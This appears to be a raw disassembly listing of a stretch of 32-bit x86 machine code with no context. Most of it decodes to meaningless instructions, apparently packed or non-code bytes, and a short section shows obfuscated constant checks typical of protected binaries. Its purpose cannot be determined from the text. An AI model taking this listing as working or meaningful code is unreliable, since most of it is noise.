  41df97:	jae    0x41dfac
  41df99:	jecxz  0x41dfe9
  41df9b:	fld    TBYTE PTR [ecx]
  41df9d:	data16 mov bh,0xb3
  41dfa0:	lea    ebp,[ebp+0x72]
  41dfa3:	dec    eax
  41dfa4:	lods   al,BYTE PTR ds:[esi]
  41dfa5:	out    dx,eax
  41dfa6:	fs retf 0xffb3
  41dfaa:	arpl   WORD PTR [edi],ax
  41dfac:	jge    0x41df6b
  41dfae:	and    BYTE PTR [edx],ch
  41dfb0:	fnstenv [esi+0x500684e7]
  41dfb6:	cmp    esp,DWORD PTR [eax-0x68]
  41dfb9:	pop    esp
  41dfba:	dec    esi
  41dfbb:	pop    ds
  41dfbc:	xor    dh,BYTE PTR [ecx+0x4d]
  41dfbf:	mov    al,0x72
  41dfc1:	inc    edx
  41dfc2:	sub    DWORD PTR [eax],0xffffffa4
  41dfc5:	pop    si
  41dfc7:	je     0x41e00c
  41dfc9:	jmp    0x41df9e
  41dfcb:	xor    al,0xdc
  41dfcd:	jmp    0x41e011
  41dfcf:	cdq    
  41dfd0:	pshufw mm7,mm3,0x26
  41dfd4:	inc    ebx
  41dfd5:	push   ecx
  41dfd6:	loopne 0x41df99
  41dfd8:	xchg   ecx,eax
  41dfd9:	fdivr  QWORD PTR [ecx+0x4f]
  41dfdc:	inc    esi
  41dfdd:	add    BYTE PTR ds:0x4db92e5a,al
  41dfe3:	push   ss
  41dfe4:	aas    
  41dfe5:	gs push ecx
  41dfe7:	sub    BYTE PTR [edx],dh
  41dfe9:	in     al,dx
  41dfea:	mov    ds:0x6444174f,eax
  41dfef:	ficomp DWORD PTR [ebp+0x5d]
  41dff2:	fs daa 
  41dff4:	fwait
  41dff5:	cmp    al,0x72
  41dff7:	jg     0x41df9a
  41dff9:	xor    ah,dh
  41dffb:	jl     0x41e008
  41dffd:	out    dx,al
  41dffe:	aaa    
  41dfff:	mov    bl,0xab
  41e001:	mov    al,ds:0x5a8d2ca6
  41e006:	inc    eax
  41e007:	mov    esi,0xea322b0a
  41e00c:	adc    DWORD PTR [esp+ebx*4+0x5f],eax
  41e010:	mov    eax,0xa64bf05d
  41e015:	or     ch,BYTE PTR [ebx+0x6f]
  41e018:	push   eax
  41e019:	xchg   ebp,eax
  41e01a:	int3   
  41e01b:	dec    esp
  41e01c:	add    edi,DWORD PTR ds:[edx+0x1e6321a2]
  41e023:	cmp    BYTE PTR [eax],ah
  41e025:	push   edx
  41e026:	fist   WORD PTR [eax+ecx*2-0x51]
  41e02a:	and    eax,DWORD PTR [edi+0x6c]
  41e02d:	or     bl,cl
  41e02f:	mov    cl,0x4e
  41e031:	pop    es
  41e032:	pop    esi
  41e033:	(bad)  [esi]
  41e035:	mov    bh,0x93
  41e037:	xor    eax,0xdb3faa19
  41e03c:	push   cs
  41e03d:	pop    es
  41e03e:	lods   al,BYTE PTR ds:[esi]
  41e03f:	or     dh,cl
  41e041:	adc    al,0x50
  41e043:	daa    
  41e044:	inc    edx
  41e045:	rcl    DWORD PTR [ebp+ebx*2-0x586f0ac5],cl
  41e04c:	test   DWORD PTR [ebx],edx
  41e04e:	inc    esi
  41e04f:	inc    esp
  41e050:	push   ebx
  41e051:	out    0x40,al
  41e053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e054:	fnstenv cs:[ebp-0x6470df1b]
  41e05b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e05c:	or     al,0xa9
  41e05e:	mov    eax,0x1f827d30
  41e063:	xchg   esi,eax
  41e064:	xchg   ebp,eax
  41e065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e066:	xor    BYTE PTR [ebx],dh
  41e068:	add    ch,BYTE PTR [edi-0x764ef81c]
  41e06e:	xor    DWORD PTR [ecx-0x5d],edi
  41e071:	mov    esp,0x2e7ff366
  41e076:	retf   0xb24d
  41e079:	add    ebp,DWORD PTR [ebp-0x3b57072c]
  41e07f:	mov    edi,0xcec14e73
  41e084:	cld    
  41e085:	popa   
  41e086:	loopne 0x41e06e
  41e088:	mov    ah,0xda
  41e08a:	loop   0x41e077
  41e08c:	jl     0x41e0a3
  41e08e:	jg     0x41e06d
  41e090:	mov    eax,ds:0x5537ee6f
  41e095:	mov    ebp,0x9043bf2
  41e09a:	ss clc 
  41e09c:	fiadd  WORD PTR [edi]
  41e09e:	fcmovnb st,st(0)
  41e0a0:	dec    esp
  41e0a1:	cmp    DWORD PTR [ebx-0x29],0x8f11f59a
  41e0a8:	jo     0x41e04e
  41e0aa:	xchg   ebx,eax
  41e0ab:	xchg   ebp,eax
  41e0ac:	cmp    ebx,eax
  41e0ae:	xor    dl,dl
  41e0b0:	jl     0x41e09b
  41e0b2:	jnp    0x41e043
  41e0b4:	xor    eax,0x2fef1b6b
  41e0b9:	ret    0xfcfb
  41e0bc:	or     eax,0x98be8f16
  41e0c1:	or     al,0xa1
  41e0c3:	pop    edi
  41e0c4:	mov    cl,0x59
  41e0c6:	mov    ebp,0x3b42f595
  41e0cb:	cmp    eax,0xfccf6b3a
  41e0d0:	daa    
  41e0d1:	in     eax,dx
  41e0d2:	jmp    0x41e115
  41e0d4:	out    0xa6,eax
  41e0d6:	aaa    
  41e0d7:	ins    BYTE PTR es:[edi],dx
  41e0d8:	xor    eax,DWORD PTR [edx-0x633db0ae]
  41e0de:	inc    ebx
  41e0df:	sub    eax,0xf8497441
  41e0e4:	out    0x4d,eax
  41e0e6:	stos   DWORD PTR es:[edi],eax
  41e0e7:	inc    esp
  41e0e8:	mov    BYTE PTR [eax],ah
  41e0ea:	jmp    0x9cd7:0x98f1a353
  41e0f1:	push   edi
  41e0f2:	les    edi,FWORD PTR [edx]
  41e0f4:	add    eax,0xc515cc5c
  41e0f9:	pop    esp
  41e0fa:	test   BYTE PTR [esi+ebp*1-0x3c7d436d],al
  41e101:	mov    eax,0x7f10a207
  41e106:	adc    esi,DWORD PTR [esi-0x2c]
  41e109:	gs mov ch,0xc9
  41e10c:	adc    eax,0xbb47cfb8
  41e111:	jae    0x41e164
  41e113:	in     eax,dx
  41e114:	jle    0x41e0ce
  41e116:	pop    esi
  41e117:	hlt    
  41e118:	mov    DWORD PTR [esp+0x10],0x421a
  41e120:	mov    eax,DWORD PTR [esp+0x10]
  41e124:	and    eax,0xffffc244
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	and    ch,dh
  41e1f3:	retf   
  41e1f4:	jo     0x41e1bc
  41e1f6:	aas    
  41e1f7:	push   ss
  41e1f8:	sbb    BYTE PTR [edx+edx*1-0x7968e7e8],bh
  41e1ff:	in     al,0x30
  41e201:	ss xchg edx,eax
  41e203:	(bad)  
  41e204:	clc    
  41e205:	adc    bl,BYTE PTR [edi-0x4719788]
  41e20b:	jns    0x41e274
  41e20d:	push   esp
  41e20e:	dec    ecx
  41e20f:	push   0x419d76fb
  41e214:	neg    DWORD PTR [esi+0x26d06cf3]
  41e21a:	scas   al,BYTE PTR es:[edi]
  41e21b:	add    DWORD PTR [esi+0x57d80609],0xf2e08171
  41e225:	aaa    
  41e226:	add    DWORD PTR [esi],ebx
  41e228:	sub    BYTE PTR [edi],dl
  41e22a:	dec    esp
  41e22b:	dec    ebp
  41e22c:	push   ecx
  41e22d:	add    esi,ebx
  41e22f:	adc    DWORD PTR [ebx+0x45ba5f4b],0xffffffc0
  41e236:	mov    eax,ds:0x4885f290
  41e23b:	mov    ch,0x88
  41e23d:	push   ds
  41e23e:	lahf   
  41e23f:	inc    ebp
  41e240:	sub    al,0x4f
  41e242:	add    ah,BYTE PTR [edx+0x18]
  41e245:	cmp    eax,edi
  41e247:	sub    al,0xc8
  41e249:	enter  0x3d30,0x75
  41e24d:	cwde   
  41e24e:	mov    ebp,0x58be5471
  41e253:	dec    ebp
  41e254:	pop    ebx
  41e255:	or     al,0x7b
  41e257:	jle    0x41e1eb
  41e259:	inc    ebx
  41e25a:	cmp    al,0x51
  41e25c:	data16 lods al,BYTE PTR fs:[esi]
  41e25f:	mov    cl,0x93
  41e261:	mov    dh,0x11
  41e263:	rol    BYTE PTR es:[edx-0x66797e20],1
  41e26a:	es ds js 0x41e2eb
  41e26e:	adc    dl,dh
  41e270:	popa   
  41e271:	dec    eax
  41e272:	fild   WORD PTR [ecx+eiz*2-0x1a]
  41e276:	jge    0x41e2b6
  41e278:	dec    edi
  41e279:	pop    edi
  41e27a:	mov    ebx,0x986847c2
  41e27f:	ja     0x41e2eb
  41e281:	cs in  eax,dx
  41e283:	(bad)  
  41e284:	repz pop esp
  41e286:	retf   
  41e287:	bound  esi,QWORD PTR [eax-0x391efa20]
  41e28d:	fneni(8087 only) 
  41e28f:	adc    BYTE PTR [ecx],dh
  41e291:	in     al,0x61
  41e293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e294:	and    al,0xa0
  41e296:	sar    DWORD PTR ds:0x1f0cfdfc,0xf0
  41e29d:	sahf   
  41e29e:	cwde   
  41e29f:	nop
  41e2a0:	push   ebx
  41e2a1:	adc    DWORD PTR [edi],ecx
  41e2a3:	push   DWORD PTR [ecx+0x42]
  41e2a6:	pop    esi
  41e2a7:	or     BYTE PTR [esi],cl
  41e2a9:	aas    
  41e2aa:	mov    ds:0xffefded0,al
  41e2af:	in     al,0x31
  41e2b1:	clc    
  41e2b2:	xchg   edx,eax
  41e2b3:	shl    DWORD PTR [ecx],1
  41e2b5:	xor    edx,DWORD PTR ds:0x5a48b27c
  41e2bb:	push   eax
  41e2bc:	jp     0x41e32b
  41e2be:	int3   
  41e2bf:	mov    dl,0x17
  41e2c1:	push   es
  41e2c2:	fsubp  st(2),st
  41e2c4:	mov    esp,0xef269043
  41e2c9:	aam    0xb
  41e2cb:	jmp    0xa55883b5
  41e2d0:	sti    
  41e2d1:	dec    edi
  41e2d2:	xor    al,BYTE PTR [ebx+0x65]
  41e2d5:	in     eax,dx
  41e2d6:	outs   dx,BYTE PTR ds:[esi]
  41e2d7:	lds    ecx,FWORD PTR [esi]
  41e2d9:	inc    esp
  41e2da:	lods   eax,DWORD PTR ds:[esi]
  41e2db:	pop    ds
  41e2dc:	mov    ebp,0xea801846
  41e2e1:	jg     0x41e2bf
  41e2e3:	or     BYTE PTR [ebp+0x14],bh
  41e2e6:	repz inc edi
  41e2e8:	ins    BYTE PTR es:[edi],dx
  41e2e9:	clc    
  41e2ea:	inc    eax
  41e2eb:	mov    WORD PTR [ebx+0x35709549],ss
  41e2f1:	mov    edx,DWORD PTR [esi+0x6e]
  41e2f4:	and    ecx,ebx
  41e2f6:	jbe    0x41e2d2
  41e2f8:	xchg   ebp,eax
  41e2fa:	mov    es,WORD PTR [eax+ebx*2-0x425f0518]
  41e301:	pop    ss
  41e302:	jecxz  0x41e311
  41e304:	outs   dx,BYTE PTR ds:[esi]
  41e305:	jae    0x41e350
  41e307:	and    DWORD PTR [eax+0x3bdc7a27],0x605fd65
  41e311:	loopne 0x41e296
  41e313:	je     0x41e2fb
  41e315:	pop    edi
  41e316:	test   BYTE PTR [ecx],bl
  41e318:	and    DWORD PTR [ebx+0x3058e9ab],esi
  41e31e:	mov    cl,0x40
  41e320:	stc    
  41e321:	jecxz  0x41e39c
  41e323:	bound  edx,QWORD PTR [eax+0x23664b5f]
  41e329:	adc    eax,0x1a796257
  41e32e:	popf   
  41e32f:	enter  0x6a20,0x12
  41e333:	adc    al,0xa0
  41e335:	mov    edi,0xd87eb11
  41e33a:	je     0x41e2bc
  41e33c:	jno    0x41e35b
  41e33e:	(bad)  
  41e33f:	sub    ebx,DWORD PTR [esi+0x6a]
  41e342:	out    dx,eax
  41e343:	je     0x41e3a8
  41e345:	fisub  WORD PTR [esp+eax*1]
  41e348:	(bad)  
  41e349:	cmp    DWORD PTR [edx],0x3d
  41e34c:	cmp    BYTE PTR [ebx],0x59
  41e34f:	mov    dl,dh
  41e351:	xchg   BYTE PTR [eax+0x9],al
  41e354:	bnd js 0x41e380
  41e357:	ret    
  41e358:	call   0xd89c:0x19238ffc
  41e35f:	adc    bl,bh
  41e361:	into   
  41e362:	les    ebp,FWORD PTR [ebx-0xb920de2]
  41e368:	mov    al,0xa2
  41e36a:	xchg   esp,eax
  41e36b:	sbb    ebp,DWORD PTR [eax-0x220fb640]
  41e371:	mov    ds:0x71618715,eax
  41e376:	sbb    dh,ch
  41e378:	sbb    al,0xb8
  41e37a:	xchg   ebp,eax
  41e37b:	pop    ebx
  41e37c:	mov    ss,WORD PTR [ebx-0x74]
  41e37f:	pop    edi
  41e380:	pop    ebx
  41e381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e382:	out    0x19,al
  41e384:	add    DWORD PTR [edx+esi*1-0x4],0xffffffbb
  41e389:	inc    edx
  41e38a:	sar    BYTE PTR [esi+0x121573bc],cl
  41e390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e391:	jo     0x41e36c
  41e393:	int    0x95
  41e395:	sahf   
  41e396:	dec    edi
  41e397:	inc    edx
  41e398:	push   es
  41e399:	call   FWORD PTR [edi+0x1df0c326]
  41e39f:	retf   
  41e3a0:	xchg   esp,eax
  41e3a1:	inc    edi
  41e3a2:	mov    bh,BYTE PTR ds:0x522cb427
  41e3a8:	rcr    BYTE PTR [esi+0x4d9c616d],1
  41e3ae:	fucomp st(3)
  41e3b0:	xor    dh,BYTE PTR [edi+0x5c]
  41e3b3:	xchg   BYTE PTR [edx],bl
  41e3b5:	push   edi
  41e3b6:	jg     0x41e41e
  41e3b8:	inc    edx
  41e3b9:	sub    BYTE PTR [ebp+0x35a4540b],ch
  41e3bf:	jns    0x41e3a7
  41e3c1:	popf   
  41e3c2:	scas   al,BYTE PTR es:[edi]
  41e3c3:	fiadd  WORD PTR [ebx+0x59194ff5]
  41e3c9:	das    
  41e3ca:	mov    bl,0x47
  41e3cc:	inc    ebx
  41e3cd:	inc    edx
  41e3ce:	mov    ch,BYTE PTR [eax]
  41e3d0:	pushw  ss
  41e3d2:	hlt    
  41e3d3:	clc    
  41e3d4:	mov    ecx,0x96def0cd
  41e3d9:	sub    BYTE PTR ds:0xab22,ah
  41e3de:	fcmove st,st(5)
  41e3e0:	das    
  41e3e1:	cmp    eax,0xd2fa0c14
  41e3e6:	jmp    0xf285:0x73d9b378
  41e3ed:	test   DWORD PTR [ebx+0x52],0xd9c24ae1
  41e3f4:	(bad)
  41e3f7:	xchg   ebx,eax
  41e3f8:	shl    BYTE PTR [edi+0x7b01d609],cl
  41e3fe:	sbb    al,bh
  41e400:	sub    eax,0x88c20fec
  41e405:	scas   eax,DWORD PTR es:[edi]
  41e406:	test   eax,0x8626270c
  41e40b:	in     eax,0x70
  41e40d:	arpl   WORD PTR [edx],bx
  41e40f:	pop    sp
  41e411:	dec    eax
  41e412:	push   ss
  41e413:	jbe    0x41e3d1
  41e415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e416:	mov    DWORD PTR [ebx],ebx
  41e418:	dec    ecx
  41e419:	mov    dh,0xd7
  41e41b:	ins    BYTE PTR es:[edi],dx
  41e41c:	loopne 0x41e3a6
  41e41e:	jmp    0x5498d087
  41e423:	jp     0x41e429
  41e425:	sub    al,BYTE PTR [edi-0x15]
  41e428:	div    DWORD PTR [ebp+0x24]
  41e42b:	mov    esp,0x18da2f83
  41e430:	pop    edx
  41e431:	jno    0x41e4ab
  41e433:	popf   
  41e434:	lock or al,0x54
  41e437:	fs push eax
  41e439:	adc    ecx,ebp
  41e43b:	dec    edi
  41e43c:	xchg   BYTE PTR [edi-0x2405026b],dh
  41e442:	jle    0x41e458
  41e444:	xor    DWORD PTR [eax],ecx
  41e446:	add    eax,0xb5b30564
  41e44b:	sbb    BYTE PTR [edx],dh
  41e44d:	cmp    DWORD PTR [edx],edi
  41e44f:	das    
  41e450:	add    ch,bl
  41e452:	hlt    
  41e453:	mov    esp,0xa59a7a8e
  41e458:	sub    bh,BYTE PTR [ecx+0x75]
  41e45b:	mov    ecx,0xd9801f68
  41e460:	(bad)  
  41e462:	(bad)  [eax]
  41e464:	and    eax,0x106eaa86
  41e469:	lods   eax,DWORD PTR ds:[esi]
  41e46a:	sub    ch,cl
  41e46c:	div    BYTE PTR [esi+edx*2-0x77ffa558]
  41e473:	cmp    eax,0x9837ba1c
  41e478:	stos   BYTE PTR es:[edi],al
  41e479:	mov    ss:0xadf8e8e4,al
  41e47f:	mov    WORD PTR [esi+0x4a84baf7],gs
  41e485:	aam    0x1f
  41e487:	or     ebx,DWORD PTR [edi+0x46c0614]
  41e48d:	aaa    
  41e48e:	test   al,0x5a
  41e490:	out    dx,al
  41e491:	jnp    0x41e453
  41e493:	ret    0x4fcd
  41e496:	push   esp
  41e497:	xor    DWORD PTR [ebx-0x3b41c084],edi
  41e49d:	repz push cs
  41e49f:	int3   
  41e4a0:	popa   
  41e4a1:	push   edi
  41e4a2:	inc    ecx
  41e4a3:	into   
  41e4a4:	xchg   ebx,eax
  41e4a5:	pop    ss
  41e4a6:	aas    
  41e4a7:	fs add eax,0x3611c3ef
  41e4ad:	push   edi
  41e4ae:	or     al,0xc2
  41e4b0:	pop    esi
  41e4b1:	ins    BYTE PTR es:[edi],dx
  41e4b2:	(bad)  
  41e4b4:	jo     0x41e4f3
  41e4b6:	ret    
  41e4b7:	icebp  
  41e4b8:	or     dh,cl
  41e4ba:	sar    BYTE PTR ds:0x4eae68c0,1
  41e4c0:	xor    cl,BYTE PTR [edi+0x7669d0c]
  41e4c6:	and    DWORD PTR [esi],eax
  41e4c8:	scas   eax,DWORD PTR es:[edi]
  41e4c9:	sub    bl,ah
  41e4cb:	sub    DWORD PTR [ecx],esp
  41e4cd:	xchg   DWORD PTR [ecx-0x4811ca2e],ebx
  41e4d3:	sbb    BYTE PTR [eax],bh
  41e4d5:	cmp    eax,0xbb0f13bf
  41e4da:	dec    eax
  41e4db:	and    esp,DWORD PTR ds:0x2ef1158e
  41e4e1:	push   ds
  41e4e2:	inc    ebx
  41e4e3:	sbb    eax,0x3b4ba964
  41e4e8:	sub    eax,0xc405a474
  41e4ed:	cmp    edx,DWORD PTR ds:0xbccdef61
  41e4f3:	test   al,0xaf
  41e4f5:	pop    edi
  41e4f6:	xadd   BYTE PTR [eax-0x38],ch
  41e4fa:	out    0x6,al
  41e4fc:	push   ss
  41e4fd:	imul   BYTE PTR [edx+0x56]
  41e500:	test   al,0x69
  41e502:	cmp    edi,edi
  41e504:	cmp    DWORD PTR [ebx-0x75],eax
  41e507:	dec    esi
  41e508:	sub    dh,ch
  41e50a:	icebp  
  41e50b:	adc    al,BYTE PTR [ecx]
  41e50d:	mov    DWORD PTR [eax+0x4b6f19c],esi
  41e513:	xchg   ebp,edx
  41e515:	mov    ds:0x91aa4a29,eax
  41e51a:	pop    esi
  41e51b:	adc    DWORD PTR [ecx+0x4c2f50cf],0x70
  41e522:	add    eax,0x96f873b2
  41e527:	scas   al,BYTE PTR es:[edi]
  41e528:	pop    edx
  41e529:	arpl   sp,si
  41e52b:	pusha  
  41e52c:	stos   BYTE PTR es:[edi],al
  41e52d:	nop
  41e52e:	ins    DWORD PTR es:[edi],dx
  41e52f:	add    DWORD PTR [esi-0x7eb7f4fa],0x60515f7d
  41e539:	mov    bh,0x7
  41e53b:	cmc    
  41e53c:	cmp    eax,0x8ad7532
  41e541:	xor    al,0x55
  41e543:	cs shld esp,esi,0x93
  41e548:	dec    ebp
  41e549:	mov    edi,0x33f80f08
  41e54e:	lods   eax,DWORD PTR ds:[esi]
  41e54f:	add    DWORD PTR [eax-0x41e3e50f],ebx
  41e555:	sbb    al,0xe9
  41e557:	xchg   edi,eax
  41e558:	ins    DWORD PTR es:[edi],dx
  41e559:	mov    eax,ds:0xf7d10b0e
  41e55e:	dec    ecx
  41e55f:	fiadd  WORD PTR [ecx]
  41e561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e562:	mov    eax,ds:0x416e4daf
  41e567:	in     al,dx
  41e568:	pop    es
  41e569:	jecxz  0x41e5e5
  41e56b:	add    edi,ecx
  41e56d:	je     0x41e5e1
  41e56f:	pop    ebp
  41e570:	pop    edx
  41e571:	mov    cl,0x49
  41e573:	ret    0x6dd0
  41e576:	call   0x60102595
  41e57b:	mov    eax,DWORD PTR [ecx-0x40]
  41e57e:	cmp    eax,0xdd146fed
  41e583:	lea    edi,[ebx]
  41e585:	icebp  
  41e586:	jb     0x41e5b7
  41e588:	adc    esi,0x72
  41e58b:	xor    DWORD PTR [ebp-0x51],ebx
  41e58e:	sahf   
  41e58f:	mov    edi,0x21a2e11d
  41e594:	mov    esp,0x406740cf
  41e599:	xor    ch,0xc0
  41e59c:	in     al,dx
  41e59d:	lods   eax,DWORD PTR ds:[esi]
  41e59e:	jl     0x41e5f5
  41e5a0:	push   cx
  41e5a2:	xor    cl,0xaf
  41e5a5:	inc    eax
  41e5a6:	arpl   WORD PTR [ebp-0x54],si
  41e5a9:	nop
  41e5aa:	into   
  41e5ab:	jg     0x41e623
  41e5ad:	push   edx
  41e5ae:	add    al,cl
  41e5b0:	loopne 0x41e5b4
  41e5b2:	or     eax,ecx
  41e5b4:	jmp    0x41e983
  41e5b9:	test   BYTE PTR [esi],cl
  41e5bb:	nop
  41e5bc:	lahf   
  41e5bd:	jp     0x41e5dd
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0x59aae715
  41e5c6:	add    dh,BYTE PTR [ebx+0x7c]
  41e5c9:	imul   esi,DWORD PTR [edi],0x16
  41e5cc:	sbb    BYTE PTR [edx+edx*1-0x4d40e7e8],bh
  41e5d3:	test   esi,ebx
  41e5d5:	xchg   esp,eax
  41e5d6:	retf   0xfa62
  41e5d9:	fs pop ss
  41e5db:	loopne 0x41e60d
  41e5dd:	add    al,0x9
  41e5df:	retf   0x1201
  41e5e2:	xor    al,0xe3
  41e5e4:	gs mov edx,0x94ec88bb
  41e5ea:	dec    ebp
  41e5eb:	int3   
  41e5ec:	jl     0x41e5f3
  41e5ee:	out    dx,al
  41e5ef:	jg     0x41e641
  41e5f1:	lahf   
  41e5f2:	popf   
  41e5f3:	shr    BYTE PTR [edi+0x77f154cc],1
  41e5f9:	and    ah,BYTE PTR [ebx+0x3cd04caf]
  41e5ff:	sub    edx,DWORD PTR [edi+esi*8+0x79]
  41e603:	loope  0x41e5ed
  41e605:	movsx  ecx,dh
  41e608:	sub    DWORD PTR [edx+edi*1],esp
  41e60b:	sbb    edx,ebp
  41e60d:	mov    al,ds:0xfefc81f3
  41e612:	cmp    al,0xac
  41e614:	pop    edx
  41e615:	iret   
  41e616:	out    0x70,al
  41e618:	push   eax
  41e619:	jb     0x41e5ef
  41e61b:	push   0xe
  41e61d:	or     eax,0x281b03f4
  41e622:	push   edx
  41e623:	dec    esp
  41e624:	mov    ds:0xc98d8681,eax
  41e629:	inc    esp
  41e62a:	push   eax
  41e62b:	test   al,0x85
  41e62d:	repnz retf 
  41e62f:	jmp    0xa6a8bca0
  41e634:	je     0x41e62a
  41e636:	xor    DWORD PTR [eax+0x32],ebp
  41e639:	xor    ch,ah
  41e63b:	retf   0x5ed8
  41e63e:	sti    
  41e63f:	push   ebx
  41e640:	(bad)  
  41e641:	mov    eax,ds:0xdef0b948
  41e646:	out    0x48,eax
  41e648:	bound  esi,QWORD PTR [ebx-0x7e1b0636]
  41e64e:	es mov dh,0x91
  41e651:	icebp  
  41e652:	sbb    edx,esi
  41e654:	dec    ecx
  41e655:	sub    al,0x5f
  41e657:	pusha  
  41e658:	or     BYTE PTR [ebx],ah
  41e65a:	inc    esp
  41e65b:	xchg   BYTE PTR ds:0xd41b8f7d,al
  41e661:	mov    al,ds:0x7912ae11
  41e666:	cmp    ebp,DWORD PTR [edx]
  41e668:	mov    eax,0x168b1f67
  41e66d:	ss sahf 
  41e66f:	sub    al,0x75
  41e671:	jp     0x41e64f
  41e673:	inc    eax
  41e674:	popa   
  41e675:	dec    edx
  41e676:	mov    esi,0x8d01a7e9
  41e67b:	mov    dh,0x72
  41e67d:	cwde   
  41e67e:	pop    eax
  41e67f:	cld    
  41e680:	add    BYTE PTR [edx-0xc],ah
  41e683:	sub    edx,DWORD PTR [edx-0x6c]
  41e686:	and    BYTE PTR [edi-0xf563c8b],bl
  41e68c:	jecxz  0x41e6b9
  41e68e:	lds    edi,FWORD PTR [edi+0x56]
  41e691:	pop    es
  41e692:	jl     0x41e664
  41e694:	sub    ah,BYTE PTR [eax]
  41e696:	repnz repz and al,0x68
  41e69a:	js     0x41e6da
  41e69c:	cmp    esp,DWORD PTR [esi+0x77]
  41e69f:	sbb    cl,ch
  41e6a1:	cmp    eax,0x1242a34e
  41e6a6:	les    edx,FWORD PTR [esi]
  41e6a8:	test   eax,0x321db460
  41e6ad:	inc    eax
  41e6ae:	jecxz  0x41e685
  41e6b0:	pop    ds
  41e6b1:	imul   eax,eax,0x404cfd09
  41e6b7:	ret    
  41e6b8:	popf   
  41e6b9:	int    0x99
  41e6bb:	inc    ebx
  41e6bc:	enter  0x6759,0xf7
  41e6c0:	pusha  
  41e6c1:	push   esi
  41e6c2:	jmp    0xfff2:0xe06832b
  41e6c9:	push   ebx
  41e6ca:	xchg   esi,eax
  41e6cb:	and    DWORD PTR [ebp-0x696c0839],esp
  41e6d1:	jmp    0x41e675
  41e6d3:	jo     0x41e74a
  41e6d5:	adc    DWORD PTR [ecx+0xd],0xffffffee
  41e6d9:	xchg   DWORD PTR [ebx],edi
  41e6db:	mov    ebx,DWORD PTR [ebx]
  41e6dd:	pop    eax
  41e6de:	xor    al,0x46
  41e6e0:	shr    BYTE PTR [edx+0x53],0x46
  41e6e4:	(bad)  
  41e6e5:	and    al,0xf2
  41e6e7:	xchg   edx,eax
  41e6e8:	adc    ebp,ecx
  41e6ea:	retf   
  41e6eb:	and    edx,ebp
  41e6ed:	jae    0x41e6b2
  41e6ef:	cmp    ecx,DWORD PTR [edi-0x59d24506]
  41e6f5:	rcr    BYTE PTR [esi+0x70],1
  41e6f8:	mov    al,ds:0x5c4fb3a9
  41e6fd:	aaa    
  41e6fe:	stos   DWORD PTR es:[edi],eax
  41e6ff:	cmp    al,0x2b
  41e701:	dec    esp
  41e702:	shl    DWORD PTR [eax+0x325e7132],1
  41e708:	mov    edx,0x3ae239b0
  41e70d:	icebp  
  41e70e:	mov    ch,0xeb
  41e710:	dec    ebp
  41e711:	mov    esi,0xe791644
  41e716:	sub    eax,0x864d56a7
  41e71b:	nop
  41e71c:	and    DWORD PTR [eax-0x4783c874],ebx
  41e722:	and    ch,ah
  41e724:	scas   eax,DWORD PTR es:[edi]
  41e725:	les    ecx,FWORD PTR [ebx-0x60]
  41e728:	mov    eax,0x447d511d
  41e72d:	ret    0xfe53
  41e730:	loopne 0x41e781
  41e732:	add    BYTE PTR [ecx+0x4c1ae9b3],ah
  41e738:	mov    al,0x18
  41e73a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e73b:	daa    
  41e73c:	outs   dx,BYTE PTR ds:[esi]
  41e73d:	xchg   edx,eax
  41e73e:	push   ds
  41e73f:	xor    eax,0xb9824c96
  41e744:	rol    BYTE PTR [edx],1
  41e746:	pusha  
  41e747:	pushf  
  41e748:	sbb    edi,DWORD PTR [eax+0x67]
  41e74b:	fisubr WORD PTR [edx-0x43fc10bc]
  41e751:	inc    ebp
  41e752:	xchg   BYTE PTR [ecx],ch
  41e754:	aam    0x71
  41e756:	cmp    dl,BYTE PTR [esi+0x4364b727]
  41e75c:	arpl   sp,sp
  41e75e:	pop    ss
